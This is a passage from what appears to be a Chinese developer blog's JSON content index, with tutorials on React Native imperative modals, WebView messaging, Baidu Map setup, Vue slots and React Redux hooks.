每一处掺杂着这些状态，特别的烦，能不能像 alter 一样，直接函数调用呢？答案是可以的。 命令式弹窗要实现这个功能，关键的地方就是需要用到 react-native-root-siblings。 首先先写一个通用的 Modal HOC，方便后面陆续的封装。 123456789101112131415161718192021222324252627import React, &#123; ComponentType &#125; from &apos;react&apos;;import RootSiblings from &apos;react-native-root-siblings&apos;;import &#123; Modal &#125; from &apos;react-native&apos;;export default () =&gt; &#123; let siblings = null; return function &lt;Props&gt;(C: ComponentType&lt;Props&gt;) &#123; let obj = &#123; show, hide &#125;; function hide() &#123; siblings &amp;&amp; siblings.destroy(); &#125; function show(props?: Props) &#123; siblings = new RootSiblings( &lt;Modal animationType=&apos;fade&apos; visible=&#123;true&#125; hardwareAccelerated=&#123;true&#125; transparent=&#123;true&#125; onRequestClose=&#123;hide&#125;&gt; &lt;C &#123;...props&#125; modal=&#123;obj&#125; /&gt; &lt;/Modal&gt; ); &#125; return obj; &#125;&#125;; 编写一个 ImageModalView 完事。 12345678910111213141516import React from &apos;react&apos;;import ImageViewer from &apos;react-native-image-zoom-viewer&apos;;import modal from &apos;../components/hoc/baseModal&apos;;export interface IProps &#123; images: string[], index?: number,&#125;export default modal()&lt;IProps&gt;(((&#123; images = [], index = 0 &#125;) =&gt; ( &lt;ImageViewer imageUrls=&#123;images.map(i =&gt; (&#123; url: i &#125;))&#125; index=&#123;index&#125; /&gt;))); 使用的时候，贼爽。 12345678import imageView from '../../views-modal/ImageView';// 真正的命令式弹窗imageView.show(&#123; images: [ 'https://img2.woyaogexing.com/2019/09/26/9f5ec010b53444349b75c5d7c0c01702!400x400.jpeg' ],&#125;); 本文完。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native + React 混合开发","slug":"React Native/React Native + React 混合开发","date":"2019-09-19T09:23:25.000Z","updated":"2021-06-15T06:10:52.858Z","comments":true,"path":"/stories/2019/09/React Native/React Native + React 混合开发/","link":"","permalink":"http://me.lizhooh.com/stories/2019/09/React Native/React Native + React 混合开发/","excerpt":"前言实际上这里指的是 React Native 里使用 WebView 加载 H5 页面来实现对应的效果。而这个 H5 是使用 React/PReact 编写的。","text":"前言实际上这里指的是 React Native 里使用 WebView 加载 H5 页面来实现对应的效果。而这个 H5 是使用 React/PReact 编写的。 使用 WebView因为 WebView 在新版本里被迁移到其他仓库了，因此需要另外安装： 12yarn add react-native-webviewreact-native link react-native-webview 既然部分页面使用 h5 来实现，因此可以直接将 h5 打包进 app 里。在 android 上需要把 h5 放到 android\\app\\src\\main\\assets 的目录里。 在引入的使用使用 file:///android_asset/你的文件 的方式来引入。 123456789101112import React from 'react';import WebView from 'react-native-webview';export default () =&gt; ( &lt;WebView style=&#123;&#123; flex: 1 &#125;&#125; originWhitelist=&#123;['*']&#125; source=&#123;&#123; uri: 'file:///android_asset/h5/index.html' &#125;&#125; /&gt;); 页面之间通信新版本通信方式改了，之前的 window.postMessage 改成 window.ReactNativeWebView.postMessage，主要是 window.postMessage 是一个已知的属性（用在 worker 里）。 假设现在要把 App 上的 token 传给 h5，可以这样做。 1234567891011121314151617181920212223const token = 'abc123';const INJECTED_JAVASCRIPT = `(function() &#123; window.token = '$&#123;token&#125;'; setTimeout(function () &#123; window.ReactNativeWebView.postMessage(window.token); &#125;, 2000)&#125;)();`;export default () =&gt; ( &lt;WebView style=&#123;&#123; flex: 1 &#125;&#125; originWhitelist=&#123;['*']&#125; injectedJavaScript=&#123;INJECTED_JAVASCRIPT&#125; source=&#123;&#123; uri: 'file:///android_asset/h5/index.html' &#125;&#125; onMessage=&#123;e =&gt; &#123; alert(e.nativeEvent.data); &#125;&#125; /&gt;); 除了使用 props 的方式，还可以使用 ref 的方式。 12345678910111213&lt;WebView style=&#123;&#123; flex: 1 &#125;&#125; originWhitelist=&#123;['*']&#125; ref=&#123;r =&gt; this.webview = r&#125; source=&#123;&#123; uri: 'file:///android_asset/h5/index.html' &#125;&#125; onMessage=&#123;e =&gt; &#123; alert(e.nativeEvent.data); &#125;&#125;/&gt;this.webview.injectJavaScript(INJECTED_JAVASCRIPT); 由于推拉的 api 是相对的，因此，在 h5 里： 123456// 推window.ReactNativeWebView.postMessage(str);// 拉window.ReactNativeWebView.onMessage(function(str) &#123; console.log(str); //&#125;); 在 app 里： 123456789// 推this.webview.postMessage(str);&lt;WebView ... onMessage=&#123;e =&gt; &#123; alert(e.nativeEvent.data); &#125;&#125;/&gt; 值得注意的是数据通信只能传递 string 类型的数据，请自行的做好 JSON 序列化与反序列化。 参考资料 https://github.com/react-native-community/react-native-webview/blob/master/docs/Guide.md#communicating-between-js-and-native https://github.com/react-native-community/react-native-webview/blob/master/docs/Reference.md#onmessage","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 接入百度地图服务","slug":"React Native/React Native 接入百度地图服务","date":"2019-09-13T09:38:51.000Z","updated":"2021-06-15T06:10:52.863Z","comments":true,"path":"/stories/2019/09/React Native/React Native 接入百度地图服务/","link":"","permalink":"http://me.lizhooh.com/stories/2019/09/React Native/React Native 接入百度地图服务/","excerpt":"前言申请 SDK AppKey先去去百度地图的控制台 里创建一个 Android/iOS 的 应用。 创建的时候看到，需要 App SHA1，接下看看怎么去获取。如果是开发版，暂时没有弄密钥那就用默认的 debug.keystore。在根目录下执行以下的命令获取：","text":"前言申请 SDK AppKey先去去百度地图的控制台 里创建一个 Android/iOS 的 应用。 创建的时候看到，需要 App SHA1，接下看看怎么去获取。如果是开发版，暂时没有弄密钥那就用默认的 debug.keystore。在根目录下执行以下的命令获取： 1234cd android/app// 如果是生产版本，就换成生产的 keystore 就行keytool -v -list -keystore debug.keystore// 输入密码或空格 ~ 接入 React Native在 React Native 里接入百度地图使用的是 react-native-baidu-map 这个库。 安装123yarn add react-native-baidu-map// 如果使用 0.60+，请不要 link，不然报错react-native-link react-native-baidu-map 添加权限123456789101112131415&lt;!-- 这个权限用于进行网络定位--&gt;&lt;uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" /&gt;&lt;!-- 这个权限用于访问GPS定位--&gt;&lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt;&lt;!-- 用于访问wifi网络信息，wifi信息会用于进行网络定位--&gt;&lt;uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\" /&gt;&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;&lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/&gt;&lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt;&lt;uses-permission android:name=\"com.android.launcher.permission.READ_SETTINGS\" /&gt;&lt;uses-permission android:name=\"android.permission.WAKE_LOCK\"/&gt;&lt;uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\" /&gt;&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;&lt;uses-permission android:name=\"android.permission.WRITE_SETTINGS\" /&gt; 添加 AppKey1234567891011&lt;application android:name=\".MainApplication\" android:allowBackup=\"true\" android:label=\"@string/app_name\" android:icon=\"@mipmap/ic_launcher\" android:theme=\"@style/AppTheme\"&gt; &lt;!-- 百度地图 AppKey --&gt; &lt;meta-data android:name=\"com.baidu.lbsapi.API_KEY\" android:value=\"你的 AppKey\"/&gt; 编译添加完成后，重新编译（react-native run-android）。果然，如果有这么顺利就不叫 React Native，编译后一堆报错。 最低的 Android SDK 版本要求是 19+，这时安装要求修改一下。在 android\\build.gradle 里： 123456789buildscript &#123; ext &#123; buildToolsVersion = \"28.0.3\" minSdkVersion = 19 // 这里 compileSdkVersion = 28 targetSdkVersion = 28 supportLibVersion = \"28.0.0\" &#125; ... 改了之后编译成功了，运行起来试试。果然，你大爷的，导入一个库而已，经历几波错误还不够。 码的，作者说支持 react-native 0.57，实际上用的时候 react-native 0.59 以上都不支持，把 react-native 版本降为 0.58.4。 地图功能实现定位先安装一个 react-native-android-location-services-dialog-box 用于提示用户开启定位。 12yarn add react-native-android-location-services-dialog-boxreact-native link react-native-android-location-services-dialog-box 12345678910111213141516171819202122232425262728293031323334353637import LocationServicesDialogBox from 'react-native-android-location-services-dialog-box';checkLocationServicesIsEnabled() &#123; return LocationServicesDialogBox.checkLocationServicesIsEnabled(&#123; message: '&lt;h2&gt;开启位置服务&lt;/h2&gt;开启位置服务，获取精准定位&lt;br/&gt;', ok: '去开启', cancel: '取消', enableHighAccuracy: true, showDialog: true, openLocationServices: true, preventOutSideTouch: false, preventBackClick: false, providerListener: true &#125;).catch(err =&gt; err);&#125;onLocationProviderStatusChange = status =&gt; &#123; // console.warn(status); if (!status.enabled) &#123; this.checkLocationServicesIsEnabled(); &#125;&#125;componentWillMount() &#123; DeviceEventEmitter.addListener('locationProviderStatusChange', this.onLocationProviderStatusChange);&#125;componentDidMount() &#123; this.initLocation();&#125;componentWillUnmount() &#123; LocationServicesDialogBox.stopListener(); DeviceEventEmitter.removeListener('locationProviderStatusChange', this.onLocationProviderStatusChange);&#125; 接着使用原生的定位模块，尝试定位，因为如果自己使用百度地图的定位话，不会弹出授权框。 1234567891011121314151617181920212223242526import &#123; Geolocation &#125; from 'react-native-baidu-map';import NativeGeolocation from 'Geolocation';// https://reactnative.cn/docs/0.58/geolocation/nativeGetCurrentPosition = () =&gt; new Promise((resolve, reject) =&gt; &#123; NativeGeolocation.getCurrentPosition(resolve, reject);&#125;)async initLocation() &#123; await this.checkLocationServicesIsEnabled(); try &#123; const location = await this.nativeGetCurrentPosition(); const coordinate = [location.coords.longitude, location.coords.latitude]; // console.warn(coordinate); &#125; catch (err) &#123; console.warn(err); &#125; const position = await Geolocation.getCurrentPosition(); if (!position.address) &#123; alert('百度地图：定位失败'); &#125; this.setState(&#123; position &#125;);&#125; 添加红点使用 Marker 添加红点等指示图标。 1&lt;Marker location=&#123;&#123; longitude: 116.41248, latitude: 39.927893 &#125;&#125; /&gt; 绘制多边形1234567891011121314151617181920212223242526272829// 计算多边形的中心点getPolygonAreaCenter(points = []) &#123; const [sx, sy] = points.reduce(([sumX, sumY], val) =&gt; &#123; // 累加 x, y 的值 return [sumX + val.longitude, sumY + val.latitude]; &#125;, [0, 0]); const x = sx / points.length; const y = sy / points.length; return &#123; longitude: x.toFixed(5) * 1, latitude: y.toFixed(5) * 1 &#125;;&#125;const polygonPoints = [ &#123; longitude: 116.387112, latitude: 39.920977 &#125;, &#123; longitude: 116.385243, latitude: 39.913063 &#125;, &#123; longitude: 116.394226, latitude: 39.917988 &#125;, &#123; longitude: 116.401772, latitude: 39.921364 &#125;, &#123; longitude: 116.41248, latitude: 39.927893 &#125;,];&lt;Polygon points=&#123;polygonPoints&#125; fillColor='773399ff' // 第一个值是透明度 stroke=&#123;&#123; width: 1, color: '773399ff', &#125;&#125;/&gt;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Vue 插槽（slot）","slug":"Vue/Vue 插槽（slot）","date":"2019-09-10T13:28:58.000Z","updated":"2021-06-15T06:10:52.900Z","comments":true,"path":"/stories/2019/09/Vue/Vue 插槽（slot）/","link":"","permalink":"http://me.lizhooh.com/stories/2019/09/Vue/Vue 插槽（slot）/","excerpt":"前言Vue 实现了一套内容分发的 API，这套 API 的设计灵感源自 Web Components 规范草案，将 &lt;slot&gt; 元素作为承载分发内容的出口。 Vue 的 插槽（slot）其实就是类似 React 的 render props 模式，为什么这么说，下面来看看。","text":"前言Vue 实现了一套内容分发的 API，这套 API 的设计灵感源自 Web Components 规范草案，将 &lt;slot&gt; 元素作为承载分发内容的出口。 Vue 的 插槽（slot）其实就是类似 React 的 render props 模式，为什么这么说，下面来看看。 render props首先来看看 React 的 render props 模式。 1234567891011121314151617181920212223const A = (&#123; renderHeader, renderFooter &#125;) =&gt; ( &lt;div&gt; &lt;header&gt;&#123;renderHeader()&#125;&lt;/header&gt; &lt;footer&gt;&#123;renderFooter()&#125;&lt;/footer&gt; &lt;/div&gt;);const B = () =&gt; ( &lt;A renderHeader=&#123;() =&gt; '我是 header'&#125; renderFooter=&#123;() =&gt; '我是 footer'&#125; /&gt;);// 利用 childrenconst C = (&#123; children &#125;) =&gt; ( &lt;div&gt; &#123;children&#125; &lt;/div&gt;);const D = () =&gt; ( &lt;C&gt;我是 children&lt;/C&gt;); slot再来看看 vue 的 slot，官方示例。 12345678// C&lt;a :href='url' class='nav-link'&gt; &lt;slot&gt;&lt;/slot&gt;&lt;/a&gt;// D&lt;navigation-link url='/profile'&gt; Your Profile&lt;/navigation-link&gt; 猜都可以猜到了，结果是 Your Profile 替代 slot 的位置。 如果不放 &lt;slot&gt;，navigation 之间的内容会被抛弃，就像 react 那样，你不写上 {children} 是不会渲染的，只是 Vue 不这么直观，因为在 react 里 {} 就是一个条件渲染的语句。 命名插槽命名插槽，类似上面的 react renderHeader，renderFooter 的玩法。 1234567891011&lt;div class='container'&gt; &lt;header&gt; &lt;slot name='header'&gt;&lt;/slot&gt; &lt;/header&gt; &lt;main&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/main&gt; &lt;footer&gt; &lt;slot name='footer'&gt;&lt;/slot&gt; &lt;/footer&gt;&lt;/div&gt; 123456789101112&lt;base-layout&gt; &lt;template v-slot:header&gt; &lt;h1&gt;Here might be a page title&lt;/h1&gt; &lt;/template&gt; &lt;p&gt;A paragraph for the main content.&lt;/p&gt; &lt;p&gt;And another one.&lt;/p&gt; &lt;template v-slot:footer&gt; &lt;p&gt;Here's some contact info&lt;/p&gt; &lt;/template&gt;&lt;/base-layout&gt; 注意 v-slot 只能添加在 &lt;template&gt; 上。","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"在 React Redux 里使用 Hooks","slug":"Redux/在 React Redux 里使用 Hooks","date":"2019-09-02T03:16:26.000Z","updated":"2021-06-15T06:10:52.893Z","comments":true,"path":"/stories/2019/09/Redux/在 React Redux 里使用 Hooks/","link":"","permalink":"http://me.lizhooh.com/stories/2019/09/Redux/在 React Redux 里使用 Hooks/","excerpt":"前言React 的新 Hooks API 使得函数组件能够使用状态和执行副作用等。 React Redux 现在提供了一组 Hooks API，作为现有的 connect API 高阶组件的替代品。这些 API 允许您订阅 Redux 存储和调度操作，而无需将组件包装在 connect 中。 React Hooks 在 v16.8 得到支持。 React Redux Hooks 在 v7.1 得到支持。","text":"前言React 的新 Hooks API 使得函数组件能够使用状态和执行副作用等。 React Redux 现在提供了一组 Hooks API，作为现有的 connect API 高阶组件的替代品。这些 API 允许您订阅 Redux 存储和调度操作，而无需将组件包装在 connect 中。 React Hooks 在 v16.8 得到支持。 React Redux Hooks 在 v7.1 得到支持。 在 Redux Redux 里使用 HooksReact Redux 为我们提供了 3 个 Hooks 函数，分别是： useSelector() useDispatch() useStore() 下面介绍这几个函数的使用。 使用选择器（useSelector）useSelector 允许您使用 selector 从 Redux 存储状态中提取数据，下面是其函数定义。 1234export function useSelector&lt;TState, TSelected&gt;( selector: (state: TState) =&gt; TSelected, equalityFn?: (left: TSelected, right: TSelected) =&gt; boolean): TSelected; selector 大致相当于概念上 connect 的 mapStateToProps 参数。将以整个 Redux 存储状态作为唯一参数调用 selector。只要函数组件渲染，就会执行 selector 。useSelector() 还可以订阅 Redux Store，并在 dispatch 操作时执行 selector。 selector 和 mapStateToProps 函数之间存在一些差异： mapStateToProps 只能返回对象，selector 可以返回任何值，而不仅仅是对象。selector 的返回值将用作 useSelector() 挂钩的返回值里。 dispatch 操作时，useSelector() 将对前一个 selector 结果值和当前结果值进行浅层比较。如果它们不同，则将强制重新渲染组件。如果它们相同，则组件不会重新渲染。 selector 函数并没有注入 props 说法。但是，可以通过闭包或使用 curried selector 来注入 props。 使用 memoizing selector 时必须格外小心，有可能会导致不会重新渲染（后面有的解释）。 useSelector() 在默认情况下使用严格的引用相等性检查，而不是浅等式。 useSelector() 可以在单个功能组件中多次调用。每次调用 useSelector() 都会创建对 Redux Store 的单独订阅。由于 React Redux v7 中使用了 React 批处理更新行为，因此 useSelector() 在同一组件中的多个 useSelector 返回新值的调度操作，应该只导致单个重新渲染。 useSelector 例子基本用法： 123456789import React from 'react';import &#123; useSelector &#125; from 'react-redux';export const CounterComponent = () =&gt; &#123; const counter = useSelector(state =&gt; state.counter) return ( &lt;div&gt;&#123;counter&#125;&lt;/div&gt; );&#125;; connect 由于是 HOC 组件，因此可以作用在类组件和函数组件上，在类组件上可以使用 @connect 装饰其行为。 上面的示例代码相当于： 123456import React from 'react';import &#123; connect &#125; from 'react-redux';export const connect(state =&gt; (&#123; counter: state.counter &#125;))(() =&gt; ( &lt;div&gt;&#123;counter&#125;&lt;/div&gt;))); 有时候可以通过闭包，传递 props 来控制 useSelector 的渲染，这在一些性能要求比较高的场景里非常有用。 1234567891011import React from 'react';import &#123; useSelector &#125; from 'react-redux';// 只有 id 改变时，才会重新执行 selector。export const TodoListItem = (&#123; id &#125;) =&gt; &#123; const todo = useSelector(state =&gt; state.todos[id], [id]); return ( &lt;div&gt;&#123;counter&#125;&lt;/div&gt; );&#125;; 组件对比与更新（shallowEqual）当函数组件渲染时，将调用提供的 selector 函数，并从 useSelector() 钩子返回其结果（如果 selector 已执行且未更改，则可能会返回缓存结果）。 但是，当将操作分派给 Redux Store 时，useSelector() 里 selector 的结果，如果看起来与上一个结果不同，则会进行强制重新渲染。 从 v7.1.0-alpha.5 开始，默认比较是严格的 === 参考比较。这与 connect() 使用对 mapStateToProps 调用结果的浅等式检查，以确定是否需要重新渲染不同。这对你应该如何使用有几个useSelector() 的策略有一定的影响。 使用 mapStateToProps 时，所有单个字段都在组合对象中返回，返回对象是否是新引用并不重要，因为 connect() 只是比较各个字段的值或引用。使用 useSelector()，每次返回一个新对象将始终强制重新渲染。 在默认情况下，如果要从 Store 中检索多个值，可以： 使用 useSelector() 多次，每次调用返回单个字段值。 使用 reselect 或类似的库，创建一个 memoized selector，它在一个对象中返回多个值，但只在其中一个值发生更改时才返回一个新对象。 使用 shallowEqualReact，在 useSelector() 的第二个参数里就是 equalityFn，例如： 123import &#123; shallowEqual, useSelector &#125; from 'react-redux';const selectedData = useSelector(selectorReturningObject, shallowEqual); equalityFn 还可以使用 Lodash 的 isEqual() 或 Immutable.js 的 eq() 函数。 状态记忆状态记忆指的是使用 reselect 等这样的库，对数据的状态进行缓存，避免了重复计算的问题，当且仅当状态改变时才会重新计算。 reselect 库可以创建可记忆的（Memoized）、可组合的 selector 函数。reselect selectors 可以用来高效地计算 Redux store 里的衍生数据。 当使用 useSelector 进行内联 selector 时，只要渲染组件，就会创建新的 selector 实例。 当 selector 仅依赖于状态时，只需确保它在组件外部声明，以便组件每次渲染时都使用相同的 selector 实例： 123456789101112131415161718192021222324import React from 'react';import &#123; useSelector &#125; from 'react-redux';import &#123; createSelector &#125; from 'reselect';// 将 selector 放在组件外面// state.todos 的引用改变才会重新计算 filter。const selectNumOfDoneTodos = createSelector( state =&gt; state.todos, todos =&gt; todos.filter(todo =&gt; todo.isDone).length);export const DoneTodosCounter = () =&gt; &#123; const NumOfDoneTodos = useSelector(selectNumOfDoneTodos); return &lt;div&gt;&#123;NumOfDoneTodos&#125;&lt;/div&gt;;&#125;export const App = () =&gt; &#123; return ( &lt;&gt; &lt;span&gt;Number of done todos:&lt;/span&gt; &lt;DoneTodosCounter /&gt; &lt;/&gt; );&#125; 如果 selector 依赖于组件的 props，但是只会在单个组件的单个实例中使用，则情况也是这样： 123456789101112131415161718192021222324252627import React from 'react';import &#123; useSelector &#125; from 'react-redux';import &#123; createSelector &#125; from 'reselect';// selectNumOfTodosWithIsDoneValue(state, isDone);const selectNumOfTodosWithIsDoneValue = createSelector( state =&gt; state.todos, // 参数一 (_, isDone) =&gt; isDone, // 参数二 (todos, isDone) =&gt; todos.filter(todo =&gt; todo.isDone === isDone).length);export const TodoCounterForIsDoneValue = (&#123; isDone &#125;) =&gt; &#123; const NumOfTodosWithIsDoneValue = useSelector(state =&gt; selectNumOfTodosWithIsDoneValue(state, isDone) ); return &lt;div&gt;&#123;NumOfTodosWithIsDoneValue&#125;&lt;/div&gt;;&#125;;export const App = () =&gt; &#123; return ( &lt;&gt; &lt;span&gt;Number of done todos:&lt;/span&gt; &lt;TodoCounterForIsDoneValue isDone=&#123;true&#125; /&gt; &lt;/&gt; );&#125; 但是，当选择器在多个组件实例中使用并依赖于组件的 props 时，您需要确保每个组件实例都有自己的选择器实例： 12345678910111213141516171819202122232425262728293031323334353637import React, &#123; useMemo &#125; from 'react';import &#123; useSelector &#125; from 'react-redux';import &#123; createSelector &#125; from 'reselect';// 2.const makeNumOfTodosWithIsDoneSelector = () =&gt; createSelector( state =&gt; state.todos, (_, isDone) =&gt; isDone, (todos, isDone) =&gt; todos.filter(todo =&gt; todo.isDone === isDone).length);export const TodoCounterForIsDoneValue = (&#123; isDone &#125;) =&gt; &#123; // 1. const selectNumOfTodosWithIsDone = useMemo( // 2. makeNumOfTodosWithIsDoneSelector, [], ); const numOfTodosWithIsDoneValue = useSelector(state =&gt; // 1. selectNumOfTodosWithIsDone(state, isDone) ); return &lt;div&gt;&#123;numOfTodosWithIsDoneValue&#125;&lt;/div&gt;;&#125;;export const App = () =&gt; &#123; return ( &lt;&gt; &lt;span&gt;Number of done todos:&lt;/span&gt; &lt;TodoCounterForIsDoneValue isDone=&#123;true&#125; /&gt; &lt;span&gt;Number of unfinished todos:&lt;/span&gt; &lt;TodoCounterForIsDoneValue isDone=&#123;false&#125; /&gt; &lt;/&gt; );&#125; reselect 的使用和学习曲线比较陡峭，这里就不再陆续说明了，具体请看：官方的文档。 调度函数（useDispatch）在 redux 里 dispatch 就是一个调度函数，负责调用 action 到 reducer 里。 在 react redux 里提供了 useDispatch()，此钩子返回 dispatch Redux Store 中函数的引用。您可以根据需要使用它来发送操作。 12export function useDispatch&lt;TDispatch = Dispatch&lt;any&gt;&gt;(): TDispatch;export function useDispatch&lt;A extends Action = AnyAction&gt;(): Dispatch&lt;A&gt;; 当在回调函数里使用 dispatch 传递给子组件时，建议使用 useCallback 进行记忆性缓存，否则子组件可能会因更改的引用而不必要的渲染。 12345678910111213141516171819202122import React, &#123; memo, useCallback &#125; from 'react';import &#123; useDispatch &#125; from 'react-redux';export const CounterComponent = (&#123; value &#125;) =&gt; &#123; const dispatch = useDispatch(); const incrementCounter = useCallback( () =&gt; dispatch(&#123; type: 'increment-counter' &#125;), [dispatch] ); return ( &lt;div&gt; &lt;span&gt;&#123;value&#125;&lt;/span&gt; &lt;MyIncrementButton onIncrement=&#123;incrementCounter&#125; /&gt; &lt;/div&gt; );&#125;;export const MyIncrementButton = memo((&#123; onIncrement &#125;) =&gt; ( &lt;button onClick=&#123;onIncrement&#125;&gt;Increment counter&lt;/button&gt;)); 数据源（useStore）react redux 提供 useStore 可以从中获取全局的数据源。 1234export function useStore&lt; S = any, A extends Action = AnyAction&gt;(): Store&lt;S, A&gt;; 此钩子返回对传递给 &lt;Provider&gt; 组件的同一 Redux Store 的引用。 123456789import React from 'react';import &#123; useStore &#125; from 'react-redux';export const CounterComponent = (&#123; value &#125;) =&gt; &#123; const store = useStore(); const dispatch = store.dispatch; return &lt;div&gt;&#123;store.getState()&#125;&lt;/div&gt;&#125; 在大部分情况下都不会使用 useStore，如果需要连接数据请使用 useSelector。 性能优化hooks 并不是一个万能药，在有些地方上的使用还是需要注意一下的。 陈旧属性React Redux 实现中最困难的一个方面是：如何确保您的 mapStateToProps 函数被定义为 state, ownProps) 的结构。每次都会使用 “最新”的 props 去调用它。 ownProps 指的是 connect() 的第二个参数，其作用是向目标组件 注入额外的 props 函数。这个函数带有 dispatch 的调用。 在 v4 之前，Github 上报告了一些涉及边缘情况的重复错误，例如从 mapState 数据与刚刚删除的列表项的函数里发送了抛出错误的情况。 从 v5 开始，React Redux 试图保证与之的一致性 ownProps。 在 v7 中，使用 Subscription 内部的自定义类实现 connect()，这形成了嵌套层次结构。这可以确保树中较低的连接组件只有在更新了最近的连接祖先后才会收到存储更新通知。但是这依赖于每个 connect() 实例覆盖内部的 React Context 来提供唯一的 Subscription 实例以形成该嵌套，并 &lt;ReactReduxContext.Provider&gt; 使用该新 Context 值进行渲染。 当使用 hooks 函数时，将无法渲染 &lt;ReactReduxContext.Provider&gt;，这意味着也没有嵌套的订阅层次结构。因此，在依赖于使用 hooks 的组件不应该出现 connect 连接的组件。 具体而言，“陈旧属性”是指的是以下情况： selector 函数依赖于此组件的 props 来提取数据。 由于一些操作，父组件会重新渲染并传递新的道具。 但是此组件的 selector 函数在此组件有机会使用这些新的 props重新渲染之前执行。 为什么说是有机会？因为可以通过 equalityFn 或 reselect 来对比与记忆 props。 僵尸子组件僵尸子组件即：僵尸化的组件 props.children。 “僵尸子组件”特指以下情况： 在第一次传递中装入多个嵌套的与 redux 连接的组件，导致子组件在其父级之前订阅 Redux 的数据源。 将 dispatch 操作以从 Store 中删除数据，例如 todo-list 的删除操作。 这样的话，父组件将停止渲染该子组件。 但是，由于子组件首先进行了订阅，因此其订阅在父组件停止渲染之前执行。当它基于 props 从 Store 中读取值时，该数据不再存在。如果提取逻辑不小心，则可能导致抛出错误。 useSelector() 尝试通过捕获由于存储更新而执行 selector 时抛出的所有错误来处理此问题（但不会在渲染期间执行时）。发生错误时，将强制渲染组件，此时将再次执行 selector。只要 selector 是纯函数并且不依赖于 selector 抛出错误，这就可以工作。 这部分的内容讨论可以在：issues/1179 里进行。 渲染优化根据前面所说的内容，默认情况下 useSelector() 在 dispatch 操作后执行 selector 函数时，将对所选值进行引用相等比较，并且只有在所选值发生更改时才会重新渲染组件。 有一点需要注意的是，在父级组件重新渲染时，就算组件的 props 没有改变，connect() 和 useSelector() 也不会阻止组件进行重新渲染。 因此，可以根据需要自定义一个 useActions 函数和 useMemoSelector 函数，这是官方不提供的钩子函数。 useActions 的作用是将 actions 函数绑定到一个 actions 对象里上而不是在组件里使用 useDispatch。类似于 connect 的第二个参数（bindActionCreators）一样。 12345678910111213141516171819202122232425262728293031323334353637import &#123; useMemo &#125; from 'react';import &#123; bindActionCreators &#125; from 'redux';import &#123; useDispatch &#125; from 'react-redux';const actions = &#123; add: () =&gt; (&#123; type: 'increment-counter' &#125;), asyncAdd: () =&gt; async (dispatch, getState) =&gt; &#123; await new Promise(rs =&gt; setTimeout(rs, 300)); dispatch(&#123; type: 'increment-counter' &#125;); &#125;,&#125;;export function useActions(actions, deps) &#123; const dispatch = useDispatch(); return useMemo(() =&gt; &#123; if (Array.isArray(actions)) &#123; return actions.map(a =&gt; bindActionCreators(a, dispatch)); &#125; return bindActionCreators(actions, dispatch); &#125;, deps ? [dispatch, ...deps] : deps);&#125;;// 使用的时候export const App = () =&gt; &#123; const counter = useSelector(state =&gt; state.counter); const &#123; add, asyncAdd &#125; = useActions(actions); return ( &lt;div&gt; &lt;p&gt;&#123;counter&#125;&lt;/p&gt; &lt;button onClick=&#123;add&#125;&gt;点我 + 1&lt;/button&gt; &lt;button onClick=&#123;asyncAdd&#125;&gt;点我 async + 1&lt;/button&gt; &lt;/div&gt; )&#125;; useMemoSelector 的作用是对比 props 从而决定是否重新执行 selector。 12345import &#123; shallowEqual &#125; from 'react-redux';export function useMemoSelector(selector) &#123; return useSelector(selector, shallowEqual);&#125;; 好至此，react redux 的 hooks 内容讲完！🐮。 自定义扩展动作（useActions）自己实现一个 useActions 可以指定绑定 action。 12345678910111213import &#123; bindActionCreators &#125; from 'redux';import &#123; useDispatch &#125; from 'react-redux';import &#123; useMemo &#125; from 'react';export function useActions(actions, deps) &#123; const dispatch = useDispatch(); return useMemo(() =&gt; &#123; if (Array.isArray(actions)) &#123; return actions.map(a =&gt; bindActionCreators(a, dispatch)); &#125; return bindActionCreators(actions, dispatch); &#125;, deps ? [dispatch, ...deps] : deps);&#125; 参考资料 https://react-redux.js.org/api/hooks","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React - Javascript - Redux","slug":"React-Javascript-Redux","permalink":"http://me.lizhooh.com/tags/React-Javascript-Redux/"}]},{"title":"Warehouse 使用指南","slug":"Nodejs/Warehouse 使用指南","date":"2019-08-23T08:08:06.000Z","updated":"2021-06-15T06:10:52.842Z","comments":true,"path":"/stories/2019/08/Nodejs/Warehouse 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/08/Nodejs/Warehouse 使用指南/","excerpt":"前言Warehouse 是一个轻量级的 JSON 本地存储数据库。它与 LowDB 不同的是，Warehouse 不是基于 lodash 实现的，它的 API 是根据 Mongodb 的 API 